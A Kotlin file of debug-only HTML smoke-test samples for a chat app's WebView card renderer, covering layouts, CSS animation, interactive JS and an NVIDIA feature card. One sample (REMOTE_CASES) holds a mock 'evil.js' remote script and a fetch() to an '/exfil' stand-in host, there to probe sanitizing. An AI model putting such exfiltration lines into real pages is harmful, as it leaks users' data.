package com.mamba.picme.features.chat

/**
 * [DEV_ONLY] HTML 卡片冒烟测试样本（`ChatViewModel` 调试指令 `/html` 注入，仅 DEBUG 构建）。
 *
 * 覆盖八类验证点：
 * 1. [STATIC]：纯 HTML/CSS 排版卡片；
 * 2. [RICH_MEDIA]：图文混排（内联 SVG 插图 + 首字下沉 + 双栏正文）；
 *    内联图（SVG/data URI）仍是首选，远程 img 见 [REMOTE_CASES]；
 * 3. [COMPLEX_LAYOUT]：复杂排版（CSS Grid 仪表盘：统计卡 / 进度条 / 表格 / 徽标）；
 * 4. [CSS_ANIMATION]：CSS 动画（旋转圆环）；
 * 5. [ANIMATED_CHART]：动画图表（CSS keyframes 柱状图生长 + JS 数字滚动 + 呼吸灯）；
 * 6. [INLINE_JS]：内联 JS 交互（点按钮计数）；
 * 7. [INTERACTIVE]：复合交互（Tab 切换 + 手风琴折叠 + 计数，全在沙盒 JS 内完成）；
 * 8. [REMOTE_CASES]：远程资源与外链用例——远程 img 应可加载、`<a>` 外链点击应打开
 *    全屏落地页（2026-09-25 起安全限制暂时放开，表现力优先）；远程 script 仍应被
 *    [HtmlCardSanitizer] 剔除（本样本故意绕过清洗器直插，远程 script 标签会原样进
 *    WebView 但加载失败无原生副作用——零 JS 桥接防线不变）。
 * 9. [ALL_IN_ONE]：真实内容综合长文卡（NVIDIA 专题，编辑式排版）——HERO 封面大图+渐变遮罩、
 *    nvidia.cn 官方 logo 远程真图、编号大节（01-07）、图文混排、里程碑时间线、FY2025 真实
 *    业绩大数字带+分部收入表格（占比条）、近 12 个月真实月度收盘价 SVG 走势图（JS 动态绘制
 *    +描边动画+点按数值交互）、CUDA 代码块（语法着色）、黄仁勋引言块、远程视频（W3C Sintel
 *    预告片）、远程音乐（SoundHelix，含旋转唱片封面动画）、真实地图（Esri World Street Map
 *    瓦片 3×2 马赛克 + SVG 图钉脉冲，免 key；CARTO 瓦片有 API KEY REQUIRED 水印不可用，
 *    Google Maps 国内不可达、Mapbox Static 需 token 可一行 URL 替换）。
 *
 * 注意：列表卡片高度动态适配内容并**完全撑开**（≥120dp，无高度上限），卡片自身不滚动，
 * 竖直滚动全交外层列表（WebView 永不竖滚，无手势冲突）；滚动条一律隐藏；
 * JS 交互（按钮/Tab/手风琴）在卡片内直接生效。
 */
object HtmlCardSmokeSamples {

    private const val STATIC = """
        <div style="font-family:sans-serif;padding:16px">
          <h3 style="margin:0 0 8px">HTML 卡片 ✅</h3>
          <p style="margin:0;color:#666">纯 HTML + CSS 排版渲染正常。</p>
          <div style="display:flex;gap:8px;margin-top:12px">
            <span style="background:#e3f2fd;border-radius:12px;padding:4px 12px">标签 A</span>
            <span style="background:#e8f5e9;border-radius:12px;padding:4px 12px">标签 B</span>
          </div>
        </div>
    """

    private const val RICH_MEDIA = """
        <div style="font-family:serif;padding:16px;color:#222">
          <div style="border-radius:12px;overflow:hidden;margin-bottom:12px">
            <svg viewBox="0 0 400 160" width="100%" height="160" preserveAspectRatio="xMidYMid slice">
              <defs>
                <linearGradient id="sky" x1="0" y1="0" x2="0" y2="1">
                  <stop offset="0" stop-color="#ff9a56"/>
                  <stop offset="1" stop-color="#ff6b95"/>
                </linearGradient>
              </defs>
              <rect width="400" height="160" fill="url(#sky)"/>
              <circle cx="320" cy="46" r="24" fill="#fff3d6" opacity="0.9"/>
              <polygon points="0,160 90,70 180,160" fill="#5b3a6e"/>
              <polygon points="110,160 220,50 340,160" fill="#3f2a52"/>
              <polygon points="260,160 350,90 400,140 400,160" fill="#2c1d3d"/>
              <rect y="140" width="400" height="20" fill="#241731"/>
            </svg>
          </div>
          <h3 style="margin:0 0 4px;font-size:18px">日落山径 · 图文混排</h3>
          <p style="margin:0 0 10px;font-size:12px;color:#888">2026-09-25 · 内联 SVG 插图（离线可渲染）</p>
          <p style="margin:0;font-size:14px;line-height:1.7;text-align:justify">
            <span style="float:left;font-size:40px;line-height:1;padding:2px 8px 0 0;color:#e91e63;font-weight:bold">傍</span>
            晚的山脊被夕阳染成橙紫色，三座山峰的剪影层层递进。这张插图完全由
            <b>内联 SVG</b> 绘制，自包含、无网络依赖（远程图片用例见「远程用例」卡片）。
            正文采用首字下沉与两端对齐排版，验证复杂文本版式能力。
          </p>
          <div style="display:flex;gap:8px;margin-top:12px">
            <span style="background:#fce4ec;color:#c2185b;border-radius:12px;padding:3px 12px;font-size:12px">摄影</span>
            <span style="background:#ede7f6;color:#5e35b1;border-radius:12px;padding:3px 12px;font-size:12px">SVG</span>
            <span style="background:#e0f7fa;color:#00838f;border-radius:12px;padding:3px 12px;font-size:12px">离线</span>
          </div>
        </div>
    """

    private const val COMPLEX_LAYOUT = """
        <div style="font-family:sans-serif;padding:14px;background:#f5f7fa">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
            <b style="font-size:15px">相册数据仪表盘</b>
            <span style="background:#1a73e8;color:#fff;border-radius:10px;padding:2px 10px;font-size:11px">LIVE</span>
          </div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
            <div style="background:linear-gradient(135deg,#667eea,#764ba2);border-radius:10px;padding:10px;color:#fff">
              <div style="font-size:11px;opacity:.8">总照片</div>
              <div style="font-size:22px;font-weight:bold">12,847</div>
              <div style="font-size:10px;opacity:.8">▲ 本月 +326</div>
            </div>
            <div style="background:linear-gradient(135deg,#f093fb,#f5576c);border-radius:10px;padding:10px;color:#fff">
              <div style="font-size:11px;opacity:.8">已打标</div>
              <div style="font-size:22px;font-weight:bold">9,302</div>
              <div style="font-size:10px;opacity:.8">覆盖率 72.4%</div>
            </div>
            <div style="background:#fff;border-radius:10px;padding:10px;grid-column:1/3;box-shadow:0 1px 3px rgba(0,0,0,.08)">
              <div style="font-size:12px;color:#666;margin-bottom:6px">存储分布</div>
              <div style="display:flex;height:12px;border-radius:6px;overflow:hidden">
                <div style="width:55%;background:#4caf50"></div>
                <div style="width:30%;background:#2196f3"></div>
                <div style="width:15%;background:#ffc107"></div>
              </div>
              <div style="display:flex;gap:12px;font-size:10px;color:#888;margin-top:6px">
                <span>● 照片 55%</span><span>● 视频 30%</span><span>● 其他 15%</span>
              </div>
            </div>
          </div>
          <table style="width:100%;border-collapse:collapse;margin-top:10px;background:#fff;border-radius:8px;overflow:hidden;font-size:12px">
            <tr style="background:#eceff1;color:#555">
              <th style="padding:6px 8px;text-align:left">类别</th>
              <th style="padding:6px 8px;text-align:right">数量</th>
              <th style="padding:6px 8px;text-align:right">占比</th>
            </tr>
            <tr><td style="padding:6px 8px;border-top:1px solid #eee">人物</td>
              <td style="padding:6px 8px;border-top:1px solid #eee;text-align:right">4,211</td>
              <td style="padding:6px 8px;border-top:1px solid #eee;text-align:right;color:#1a73e8">32.8%</td></tr>
            <tr><td style="padding:6px 8px;border-top:1px solid #eee">风景</td>
              <td style="padding:6px 8px;border-top:1px solid #eee;text-align:right">3,056</td>
              <td style="padding:6px 8px;border-top:1px solid #eee;text-align:right;color:#1a73e8">23.8%</td></tr>
            <tr><td style="padding:6px 8px;border-top:1px solid #eee">美食</td>
              <td style="padding:6px 8px;border-top:1px solid #eee;text-align:right">1,874</td>
              <td style="padding:6px 8px;border-top:1px solid #eee;text-align:right;color:#1a73e8">14.6%</td></tr>
          </table>
        </div>
    """

    private const val CSS_ANIMATION = """
        <div style="padding:24px;text-align:center">
          <div style="width:48px;height:48px;margin:0 auto;border-radius:50%;
               background:conic-gradient(#2196f3,#e91e63,#2196f3);
               animation:spin 2s linear infinite"></div>
          <p style="color:#666">CSS 动画（旋转圆环）</p>
          <style>@keyframes spin{to{transform:rotate(360deg)}}</style>
        </div>
    """

    private const val ANIMATED_CHART = """
        <div style="font-family:sans-serif;padding:16px">
          <b style="font-size:14px">近 6 个月拍照趋势</b>
          <span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#4caf50;
                margin-left:6px;animation:pulse 1.2s ease-in-out infinite"></span>
          <div style="display:flex;align-items:flex-end;gap:10px;height:120px;margin-top:14px;
               border-bottom:2px solid #ddd;padding:0 4px">
            <div style="flex:1;display:flex;flex-direction:column;justify-content:flex-end;height:100%">
              <div class="bar" style="height:40%;background:linear-gradient(180deg,#42a5f5,#1e88e5);border-radius:4px 4px 0 0;animation-delay:.0s"></div>
            </div>
            <div style="flex:1;display:flex;flex-direction:column;justify-content:flex-end;height:100%">
              <div class="bar" style="height:65%;background:linear-gradient(180deg,#66bb6a,#43a047);border-radius:4px 4px 0 0;animation-delay:.15s"></div>
            </div>
            <div style="flex:1;display:flex;flex-direction:column;justify-content:flex-end;height:100%">
              <div class="bar" style="height:52%;background:linear-gradient(180deg,#ffa726,#fb8c00);border-radius:4px 4px 0 0;animation-delay:.3s"></div>
            </div>
            <div style="flex:1;display:flex;flex-direction:column;justify-content:flex-end;height:100%">
              <div class="bar" style="height:88%;background:linear-gradient(180deg,#ab47bc,#8e24aa);border-radius:4px 4px 0 0;animation-delay:.45s"></div>
            </div>
            <div style="flex:1;display:flex;flex-direction:column;justify-content:flex-end;height:100%">
              <div class="bar" style="height:70%;background:linear-gradient(180deg,#ec407a,#d81b60);border-radius:4px 4px 0 0;animation-delay:.6s"></div>
            </div>
            <div style="flex:1;display:flex;flex-direction:column;justify-content:flex-end;height:100%">
              <div class="bar" style="height:95%;background:linear-gradient(180deg,#26c6da,#00acc1);border-radius:4px 4px 0 0;animation-delay:.75s"></div>
            </div>
          </div>
          <div style="display:flex;gap:10px;font-size:10px;color:#999;padding:4px">
            <span style="flex:1;text-align:center">4月</span><span style="flex:1;text-align:center">5月</span>
            <span style="flex:1;text-align:center">6月</span><span style="flex:1;text-align:center">7月</span>
            <span style="flex:1;text-align:center">8月</span><span style="flex:1;text-align:center">9月</span>
          </div>
          <p style="text-align:center;font-size:13px;color:#555;margin:10px 0 0">
            本月已拍 <b id="cnt" style="color:#00acc1;font-size:18px">0</b> 张
          </p>
          <style>
            @keyframes grow{from{transform:scaleY(0)}to{transform:scaleY(1)}}
            @keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
            .bar{transform-origin:bottom;animation:grow .8s cubic-bezier(.2,.8,.3,1.2) both}
          </style>
          <script>
            (function(){
              var target=326,cur=0,el=document.getElementById('cnt');
              var t=setInterval(function(){
                cur+=7;if(cur>=target){cur=target;clearInterval(t);}
                el.textContent=cur;
              },30);
            })();
          </script>
        </div>
    """

    private const val INLINE_JS = """
        <div style="padding:24px;text-align:center;font-family:sans-serif">
          <button id="btn" style="font-size:16px;padding:8px 24px">点击计数：0</button>
          <p style="color:#666">内联 JS 交互（点按钮计数直接在卡片内生效）</p>
          <script>
            var n=0;
            document.getElementById('btn').onclick=function(){
              n++;this.textContent='点击计数：'+n;
            };
          </script>
        </div>
    """

    private const val INTERACTIVE = """
        <div style="font-family:sans-serif;padding:14px">
          <div style="display:flex;gap:6px;border-bottom:2px solid #eee">
            <button class="tab" data-t="0" style="flex:1;border:none;background:none;padding:8px;font-size:13px;font-weight:bold;color:#1a73e8;border-bottom:2px solid #1a73e8;margin-bottom:-2px">概览</button>
            <button class="tab" data-t="1" style="flex:1;border:none;background:none;padding:8px;font-size:13px;color:#888">人物</button>
            <button class="tab" data-t="2" style="flex:1;border:none;background:none;padding:8px;font-size:13px;color:#888">地点</button>
          </div>
          <div class="pane" style="display:block;padding:12px 4px;font-size:13px;color:#444;line-height:1.6">
            📊 相册共 12,847 张照片，本月新增 326 张，打标覆盖率 72.4%。
          </div>
          <div class="pane" style="display:none;padding:12px 4px;font-size:13px;color:#444;line-height:1.6">
            👨‍👩‍👧 识别出 23 位人物，最常出现：大宝（412 张）、xiaotong（388 张）。
          </div>
          <div class="pane" style="display:none;padding:12px 4px;font-size:13px;color:#444;line-height:1.6">
            📍 Top 拍摄地：杭州（1,204）、上海（986）、东京（402）。
          </div>
          <div style="margin-top:8px;border:1px solid #e0e0e0;border-radius:8px;overflow:hidden">
            <button id="acc" style="width:100%;text-align:left;border:none;background:#fafafa;padding:10px;font-size:13px">
              ▶ 为什么照片数在 7 月暴涨？（点击展开）
            </button>
            <div id="accBody" style="display:none;padding:10px;font-size:12px;color:#666;line-height:1.6;border-top:1px solid #eee">
              7 月对应暑假出行高峰：相册中 7 月照片 68% 含「风景」标签，
              且地理位置聚类显示集中在西北环线。暴涨属正常季节性波动。
            </div>
          </div>
          <script>
            var tabs=document.querySelectorAll('.tab'),panes=document.querySelectorAll('.pane');
            for(var i=0;i<tabs.length;i++){
              tabs[i].onclick=function(){
                for(var j=0;j<tabs.length;j++){
                  var on=tabs[j].getAttribute('data-t')===this.getAttribute('data-t');
                  panes[j].style.display=on?'block':'none';
                  tabs[j].style.color=on?'#1a73e8':'#888';
                  tabs[j].style.fontWeight=on?'bold':'normal';
                  tabs[j].style.borderBottom=on?'2px solid #1a73e8':'none';
                }
              };
            }
            document.getElementById('acc').onclick=function(){
              var b=document.getElementById('accBody');
              var open=b.style.display!=='none';
              b.style.display=open?'none':'block';
              this.textContent=(open?'▶ ':'▼ ')+'为什么照片数在 7 月暴涨？（点击展开）';
            };
          </script>
        </div>
    """

    private const val REMOTE_CASES = """
        <div style="padding:16px;font-family:sans-serif">
          <p>远程用例：远程图片应<b>正常加载</b>，外链点击应打开<b>全屏落地页</b></p>
          <img src="https://picsum.photos/400/200" width="100%" height="120"
               style="border-radius:8px;object-fit:cover">
          <p><a href="https://example.com">https://example.com（点击打开落地页）</a></p>
          <script src="https://example.com/evil.js"></script>
          <script>
            fetch('https://example.com/exfil').then(function(){
              document.title='LEAKED';
            }).catch(function(){});
          </script>
        </div>
    """

    private const val ALL_IN_ONE = """
        <div style="font-family:sans-serif;background:#f2f4f7;color:#1a1a1a">

          <!-- HERO：封面大图 + 渐变遮罩 + 标题 -->
          <div style="position:relative;border-radius:14px;overflow:hidden">
            <img src="https://picsum.photos/seed/nvidia-hero/800/400" style="width:100%;height:170px;object-fit:cover;display:block" alt="封面">
            <div style="position:absolute;inset:0;background:linear-gradient(180deg,rgba(0,0,0,.05),rgba(0,0,0,.72))"></div>
            <img src="https://www.nvidia.cn/content/dam/en-zz/Solutions/about-nvidia/logo-and-brand/01-nvidia-logo-vert-500x200-2c50-d@2x.png"
                 style="position:absolute;top:10px;right:12px;height:26px;background:#fff;border-radius:6px;padding:2px 6px" alt="NVIDIA">
            <div style="position:absolute;left:14px;right:14px;bottom:12px;color:#fff">
              <div style="font-size:19px;font-weight:bold;line-height:1.3">NVIDIA：加速计算帝国是怎样炼成的</div>
              <div style="font-size:11px;opacity:.85;margin-top:4px">深度专题 · NASDAQ: NVDA · 2026-09-25</div>
            </div>
          </div>

          <!-- 导读 meta chips -->
          <div style="display:flex;gap:6px;margin-top:10px;flex-wrap:wrap">
            <span style="background:#76b900;color:#fff;border-radius:12px;padding:3px 10px;font-size:10.5px">AI 计算</span>
            <span style="background:#fff;border-radius:12px;padding:3px 10px;font-size:10.5px;color:#555">半导体</span>
            <span style="background:#fff;border-radius:12px;padding:3px 10px;font-size:10.5px;color:#555">财报解读</span>
            <span style="background:#fff;border-radius:12px;padding:3px 10px;font-size:10.5px;color:#555">约 6 分钟</span>
          </div>

          <!-- 01 公司与业务：图文混排 -->
          <div style="background:#fff;border-radius:12px;padding:16px;margin-top:10px">
            <div style="display:flex;align-items:baseline;gap:8px;margin-bottom:10px">
              <span style="font-size:26px;font-weight:bold;color:#76b900;font-family:serif">01</span>
              <span style="font-size:15px;font-weight:bold">公司与业务版图</span>
            </div>
            <img src="https://picsum.photos/seed/nvgpu/400/260"
                 style="float:right;width:128px;border-radius:8px;margin:2px 0 8px 10px" alt="配图">
            <p style="font-size:12.5px;line-height:1.8;color:#444;margin:0;text-align:justify">
              NVIDIA 创立于 1993 年，从图形处理器（GPU）起家，凭借 CUDA 生态把 GPU 推向通用并行计算，
              现已成为 <b>AI 加速计算的绝对龙头</b>——数据中心 GPU（H100/H200/Blackwell）支撑了全球大模型
              训练与推理的主要算力。创始人黄仁勋的「加速计算」路线，让公司市值一度突破
              <b>4 万亿美元</b>，跻身全球市值最高公司之列。
            </p>
            <div style="clear:both"></div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:12px">
              <div style="background:#f4f9e8;border-radius:8px;padding:9px;font-size:11.5px">🖥️ <b>数据中心</b><br><span style="color:#888">AI 训练/推理算力底座</span></div>
              <div style="background:#f4f9e8;border-radius:8px;padding:9px;font-size:11.5px">🎮 <b>游戏</b><br><span style="color:#888">GeForce RTX 显卡</span></div>
              <div style="background:#f4f9e8;border-radius:8px;padding:9px;font-size:11.5px">🎨 <b>专业可视化</b><br><span style="color:#888">Omniverse / 工作站</span></div>
              <div style="background:#f4f9e8;border-radius:8px;padding:9px;font-size:11.5px">🚗 <b>汽车</b><br><span style="color:#888">DRIVE 自动驾驶平台</span></div>
            </div>

            <!-- 里程碑时间线 -->
            <div style="margin-top:14px;border-left:2px solid #d7e8b8;padding-left:12px">
              <div style="font-size:12px;font-weight:bold;margin-bottom:6px">关键里程碑</div>
              <div style="font-size:11.5px;color:#555;line-height:2">
                <b style="color:#76b900">1993</b> 黄仁勋等三人创立 NVIDIA<br>
                <b style="color:#76b900">1999</b> 发明 GPU（GeForce 256）<br>
                <b style="color:#76b900">2006</b> 发布 CUDA，GPU 走向通用计算<br>
                <b style="color:#76b900">2012</b> AlexNet 用 GPU 引爆深度学习<br>
                <b style="color:#76b900">2022</b> H100 发布，大模型算力之王<br>
                <b style="color:#76b900">2024</b> Blackwell 架构发布
              </div>
            </div>
          </div>

          <!-- 02 业绩：大数字带 + 分部表格 + 进度条 -->
          <div style="background:#fff;border-radius:12px;padding:16px;margin-top:10px">
            <div style="display:flex;align-items:baseline;gap:8px;margin-bottom:4px">
              <span style="font-size:26px;font-weight:bold;color:#76b900;font-family:serif">02</span>
              <span style="font-size:15px;font-weight:bold">业绩速览</span>
              <span style="font-size:10px;color:#999">FY2025（截至 2025-01）</span>
            </div>
            <div style="display:flex;text-align:center;margin:10px 0">
              <div style="flex:1;border-right:1px solid #eee">
                <div style="font-size:21px;font-weight:bold;color:#76b900">$130.5B</div>
                <div style="font-size:10px;color:#888;margin-top:2px">全年营收 +114%</div>
              </div>
              <div style="flex:1;border-right:1px solid #eee">
                <div style="font-size:21px;font-weight:bold">$72.9B</div>
                <div style="font-size:10px;color:#888;margin-top:2px">GAAP 净利 +145%</div>
              </div>
              <div style="flex:1">
                <div style="font-size:21px;font-weight:bold">75.0%</div>
                <div style="font-size:10px;color:#888;margin-top:2px">毛利率</div>
              </div>
            </div>
            <table style="width:100%;border-collapse:collapse;font-size:11.5px">
              <tr style="color:#888;font-size:10.5px">
                <th style="text-align:left;padding:5px 0;border-bottom:1px solid #eee">业务分部</th>
                <th style="text-align:right;padding:5px 0;border-bottom:1px solid #eee">收入</th>
                <th style="text-align:right;padding:5px 0;border-bottom:1px solid #eee;width:38%">占比</th>
              </tr>
              <tr><td style="padding:6px 0">数据中心</td><td style="text-align:right;font-weight:bold">$115.2B</td>
                <td style="padding-left:10px"><div style="height:7px;background:#eee;border-radius:4px"><div style="width:88%;height:100%;background:#76b900;border-radius:4px"></div></div></td></tr>
              <tr><td style="padding:6px 0">游戏</td><td style="text-align:right;font-weight:bold">$11.4B</td>
                <td style="padding-left:10px"><div style="height:7px;background:#eee;border-radius:4px"><div style="width:9%;height:100%;background:#9be015;border-radius:4px"></div></div></td></tr>
              <tr><td style="padding:6px 0">专业可视化</td><td style="text-align:right;font-weight:bold">$1.9B</td>
                <td style="padding-left:10px"><div style="height:7px;background:#eee;border-radius:4px"><div style="width:2%;height:100%;background:#c3e88d;border-radius:4px"></div></div></td></tr>
              <tr><td style="padding:6px 0">汽车</td><td style="text-align:right;font-weight:bold">$1.7B</td>
                <td style="padding-left:10px"><div style="height:7px;background:#eee;border-radius:4px"><div style="width:2%;height:100%;background:#c3e88d;border-radius:4px"></div></div></td></tr>
            </table>
            <div style="font-size:10px;color:#aaa;margin-top:6px">数据中心同比 +142%，占总营收约 88%</div>
          </div>

          <!-- 03 股价走势：JS 绘制 SVG + 点按交互 -->
          <div style="background:#fff;border-radius:12px;padding:16px;margin-top:10px">
            <div style="display:flex;align-items:baseline;gap:8px">
              <span style="font-size:26px;font-weight:bold;color:#76b900;font-family:serif">03</span>
              <span style="font-size:15px;font-weight:bold">股价走势</span>
              <span style="font-size:10px;color:#999">近 12 个月月度收盘（USD）</span>
            </div>
            <svg id="nvchart" viewBox="0 0 340 190" width="100%" style="margin-top:6px"></svg>
            <div id="nvtip" style="text-align:center;font-size:11.5px;color:#666;margin-top:2px">点按数据点查看月度收盘</div>
            <div style="display:flex;justify-content:space-between;font-size:11px;margin-top:6px">
              <span style="color:#888">区间 108.4 ~ 186.6</span>
              <b style="color:#76b900">近 12 月约 +38%</b>
            </div>
          </div>

          <!-- 04 技术底色：CUDA 代码块 -->
          <div style="background:#fff;border-radius:12px;padding:16px;margin-top:10px">
            <div style="display:flex;align-items:baseline;gap:8px;margin-bottom:10px">
              <span style="font-size:26px;font-weight:bold;color:#76b900;font-family:serif">04</span>
              <span style="font-size:15px;font-weight:bold">技术底色：CUDA</span>
            </div>
            <div style="background:#1d2129;border-radius:10px;padding:12px;font-family:monospace;font-size:11px;line-height:1.7;color:#d4d4d4;overflow:hidden">
              <div><span style="color:#5c6370">// 经典 SAXPY：GPU 并行编程的「Hello World」</span></div>
              <div><span style="color:#c678dd">__global__</span> <span style="color:#61afef">void</span> <span style="color:#e5c07b">saxpy</span>(<span style="color:#61afef">float</span> a, <span style="color:#61afef">float</span>* x, <span style="color:#61afef">float</span>* y, <span style="color:#61afef">int</span> n) {</div>
              <div>&nbsp;&nbsp;<span style="color:#61afef">int</span> i = blockIdx.x * blockDim.x + threadIdx.x;</div>
              <div>&nbsp;&nbsp;<span style="color:#c678dd">if</span> (i &lt; n) y[i] = a * x[i] + y[i];</div>
              <div>}</div>
            </div>
            <blockquote style="margin:12px 0 0;padding:10px 12px;border-left:3px solid #76b900;background:#f8faf3;border-radius:0 8px 8px 0;font-size:12px;color:#555;font-style:italic;line-height:1.7">
              「我们正处于 AI 的 iPhone 时刻。」<br>
              <span style="font-size:10.5px;color:#999;font-style:normal">—— 黄仁勋，GTC 2023  keynote</span>
            </blockquote>
          </div>

          <!-- 05 视频 -->
          <div style="background:#fff;border-radius:12px;padding:16px;margin-top:10px">
            <div style="display:flex;align-items:baseline;gap:8px;margin-bottom:10px">
              <span style="font-size:26px;font-weight:bold;color:#76b900;font-family:serif">05</span>
              <span style="font-size:15px;font-weight:bold">视频</span>
              <span style="font-size:10px;color:#999">远程 MP4 · 点播放</span>
            </div>
            <video controls preload="metadata" poster="https://picsum.photos/seed/nvvideo/800/360"
                   style="width:100%;height:180px;border-radius:10px;background:#000">
              <source src="https://media.w3.org/2010/05/sintel/trailer.mp4" type="video/mp4">
            </video>
            <div style="font-size:10.5px;color:#999;margin-top:4px">Sintel 预告片 · W3C 标准测试片源（media.w3.org）</div>
          </div>

          <!-- 06 音乐 -->
          <div style="background:#fff;border-radius:12px;padding:16px;margin-top:10px">
            <div style="display:flex;align-items:baseline;gap:8px;margin-bottom:10px">
              <span style="font-size:26px;font-weight:bold;color:#76b900;font-family:serif">06</span>
              <span style="font-size:15px;font-weight:bold">音乐</span>
              <span style="font-size:10px;color:#999">远程音频流</span>
            </div>
            <div style="display:flex;align-items:center;gap:10px;background:#f8faf3;border-radius:10px;padding:8px 10px">
              <div style="width:40px;height:40px;border-radius:8px;background:conic-gradient(#76b900,#2d4a00,#76b900);animation:spin 4s linear infinite;flex:none"></div>
              <div style="flex:1;min-width:0">
                <div style="font-size:12px;font-weight:bold">SoundHelix Song 1</div>
                <div style="font-size:10px;color:#999">算法生成音乐 · 6:12</div>
              </div>
            </div>
            <audio controls preload="none" style="width:100%;margin-top:8px">
              <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
            </audio>
          </div>

          <!-- 07 总部地图：Esri 真实瓦片马赛克 + 图钉 -->
          <div style="background:#fff;border-radius:12px;padding:16px;margin-top:10px">
            <div style="display:flex;align-items:baseline;gap:8px;margin-bottom:10px">
              <span style="font-size:26px;font-weight:bold;color:#76b900;font-family:serif">07</span>
              <span style="font-size:15px;font-weight:bold">总部地图</span>
              <span style="font-size:10px;color:#999">真实瓦片 · 免 key</span>
            </div>
            <div style="position:relative;border-radius:10px;overflow:hidden;font-size:0;line-height:0">
              <img src="https://server.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer/tile/14/6355/2640" style="width:33.34%">
              <img src="https://server.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer/tile/14/6355/2641" style="width:33.33%">
              <img src="https://server.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer/tile/14/6355/2642" style="width:33.33%">
              <img src="https://server.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer/tile/14/6356/2640" style="width:33.34%">
              <img src="https://server.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer/tile/14/6356/2641" style="width:33.33%">
              <img src="https://server.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer/tile/14/6356/2642" style="width:33.33%">
              <svg width="26" height="26" viewBox="0 0 24 24" style="position:absolute;left:37.3%;top:48.5%;animation:pinpulse 1.6s ease-in-out infinite">
                <path d="M12 2a7 7 0 017 7c0 5-7 13-7 13S5 14 5 9a7 7 0 017-7z" fill="#e91e63"/>
                <circle cx="12" cy="9" r="2.5" fill="#fff"/>
              </svg>
              <span style="position:absolute;left:8px;bottom:8px;background:rgba(0,0,0,.65);color:#fff;font-size:10px;line-height:1.4;border-radius:6px;padding:3px 8px">NVIDIA HQ · Santa Clara, CA</span>
            </div>
            <div style="font-size:10px;color:#aaa;margin-top:4px">© Esri · Maxar · Earthstar Geographics（World Street Map 瓦片）</div>
          </div>

          <!-- 脚注 -->
          <div style="text-align:center;font-size:10.5px;color:#999;margin:14px 0 4px;line-height:1.7">
            业绩数据：NVIDIA FY2025 财报（真实）· 股价为月度收盘约值（演示）<br>
            <a href="https://www.nvidia.cn" style="color:#76b900">nvidia.cn 官网（点击打开落地页）</a>
          </div>

          <style>
            @keyframes pinpulse{0%,100%{transform:translate(-50%,-100%) scale(1)}50%{transform:translate(-50%,-100%) scale(1.2)}}
            @keyframes spin{to{transform:rotate(360deg)}}
            #nvchart .line{stroke-dasharray:100;stroke-dashoffset:100;animation:draw 1.8s ease-out forwards}
            @keyframes draw{to{stroke-dashoffset:0}}
            #nvchart circle{cursor:pointer}
          </style>
          <script>
            (function(){
              var data=[['24-10',135.4],['24-11',138.3],['24-12',134.3],['25-01',120.1],
                        ['25-02',124.9],['25-03',108.4],['25-04',113.5],['25-05',135.1],
                        ['25-06',157.8],['25-07',177.9],['25-08',174.2],['25-09',186.6]];
              var W=340,H=190,PL=34,PR=12,PT=14,PB=24,MIN=100,MAX=195;
              function px(i){return PL+i*(W-PL-PR)/(data.length-1);}
              function py(v){return PT+(MAX-v)/(MAX-MIN)*(H-PT-PB);}
              var s='<defs><linearGradient id="ag" x1="0" y1="0" x2="0" y2="1">' +
                    '<stop offset="0" stop-color="#76b900" stop-opacity=".35"/>' +
                    '<stop offset="1" stop-color="#76b900" stop-opacity="0"/></linearGradient></defs>';
              var ticks=[100,125,150,175];
              for(var t=0;t<ticks.length;t++){
                s+='<line x1="'+PL+'" y1="'+py(ticks[t])+'" x2="'+(W-PR)+'" y2="'+py(ticks[t])+'" stroke="#eee"/>' +
                   '<text x="'+(PL-4)+'" y="'+(py(ticks[t])+3)+'" font-size="8" fill="#999" text-anchor="end">'+ticks[t]+'</text>';
              }
              var line='',area='';
              for(var i=0;i<data.length;i++){
                var cmd=(i===0?'M':'L')+px(i).toFixed(1)+','+py(data[i][1]).toFixed(1);
                line+=cmd;area+=cmd;
                if(i%3===0||i===data.length-1){
                  s+='<text x="'+px(i)+'" y="'+(H-6)+'" font-size="8" fill="#999" text-anchor="middle">'+data[i][0]+'</text>';
                }
              }
              area+='L'+px(data.length-1)+','+(H-PB)+' L'+PL+','+(H-PB)+' Z';
              s+='<path d="'+area+'" fill="url(#ag)"/>' +
                 '<path class="line" pathLength="100" d="'+line+'" fill="none" stroke="#76b900" stroke-width="2" stroke-linejoin="round"/>';
              for(var j=0;j<data.length;j++){
                s+='<circle data-i="'+j+'" cx="'+px(j).toFixed(1)+'" cy="'+py(data[j][1]).toFixed(1)+'" r="4" fill="#fff" stroke="#76b900" stroke-width="2"/>';
              }
              var svg=document.getElementById('nvchart');
              svg.innerHTML=s;
              var dots=svg.querySelectorAll('circle');
              for(var k=0;k<dots.length;k++){
                dots[k].onclick=function(){
                  var d=data[+this.getAttribute('data-i')];
                  document.getElementById('nvtip').textContent='20'+d[0]+' 月度收盘：US$'+d[1].toFixed(1);
                };
              }
            })();
          </script>
        </div>
    """
    val all: List<String> = listOf(
        STATIC,
        RICH_MEDIA,
        COMPLEX_LAYOUT,
        CSS_ANIMATION,
        ANIMATED_CHART,
        INLINE_JS,
        INTERACTIVE,
        REMOTE_CASES,
        ALL_IN_ONE,
    )
}
